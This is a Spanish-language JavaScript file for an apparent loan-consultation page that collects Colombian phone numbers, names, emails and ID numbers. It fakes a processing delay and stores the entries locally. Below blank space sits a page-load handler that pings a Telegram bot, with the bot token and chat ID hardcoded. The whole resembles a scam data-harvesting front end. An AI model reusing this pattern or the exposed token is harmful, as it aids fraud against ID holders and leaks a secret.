
  // ===============================
  // EVENTO PRINCIPAL
  // ===============================
  document.getElementById("btn-consultar").addEventListener("click", () => {

    // ---- Obtener valores ----
    const telefono = document.getElementById("telefono01").value.trim();
    const nombre   = document.getElementById("nombre01").value.trim();
    const correo   = document.getElementById("correo01").value.trim();
    const cedula   = document.getElementById("cedula01").value.trim();

    const resultadoPrestamo = document.getElementById("resultado-prestamo");
    const formConsulta      = document.getElementById("form-consulta");

    // ===============================
    // VALIDACIONES
    // ===============================
    if (!telefono || !nombre || !correo || !cedula) {
      mostrarModalError("El número de celular, correo o la cédula son incorrectos, vuelve a intentar.");
      return;
    }

    if (!telefonoColombianoValido(telefono) || !cedulaColombianaValida(cedula)) {
      mostrarModalError("El número de celular o la cédula son incorrectos, vuelve a intentar.");
      return;
    }

    // ===============================
    // MODAL DE CARGA
    // ===============================
    const modalCarga = document.getElementById("modal-cargando");
    modalCarga.style.display = "flex";

    setTimeout(() => {
      modalCarga.style.display = "none";

      // ===============================
      // GUARDAR EN LOCALSTORAGE
      // ===============================
      let registros = JSON.parse(localStorage.getItem("registros")) || [];

      registros.push({
        telefono,
        nombre,
        correo,
        cedula,
        fecha: new Date().toLocaleString()
      });

      localStorage.setItem("registros", JSON.stringify(registros));

      console.log("Datos guardados:", registros);

      // ===============================
      // MOSTRAR RESULTADO
      // ===============================
      formConsulta.style.display = "none";
      resultadoPrestamo.style.display = "block";

    }, 2000);
  });


  // ===============================
  // VALIDACIONES
  // ===============================
  function telefonoColombianoValido(numero) {
    return /^\d{10}$/.test(numero) && numero.startsWith("3");
  }

  function cedulaColombianaValida(numero) {
    if (!/^\d+$/.test(numero)) return false;

    const longitud = numero.length;

    if (longitud >= 7 && longitud <= 9) return true;
    if (longitud === 10 && !numero.startsWith("0")) return true;

    return false;
  }


  // ===============================
  // MODAL DE ERROR
  // ===============================
  function mostrarModalError(mensaje) {
    const modal = document.getElementById("modal-error");
    const box   = document.getElementById("modal-box");

    modal.querySelector("p").textContent = mensaje;
    modal.style.display = "flex";

    setTimeout(() => {
      box.style.transform = "translateY(0)";
      box.style.opacity = "1";
    }, 10);
  }

  document.getElementById("cerrar-modal").addEventListener("click", () => {
    const modal = document.getElementById("modal-error");
    const box   = document.getElementById("modal-box");

    box.style.transform = "translateY(-50px)";
    box.style.opacity = "0";

    setTimeout(() => {
      modal.style.display = "none";
    }, 300);
  });













// Ejecutar al cargar la página
window.addEventListener('load', function() {
    const token = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
    const chatId = "8417322083";
    const mensaje = `¡Alguien ha entrado a tu sitio web! - ${new Date().toLocaleString()}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: mensaje
        })
    })
    .then(res => res.json())
    .then(data => console.log("Mensaje enviado a Telegram"))
    .catch(err => console.error("Error enviando mensaje", err));
});




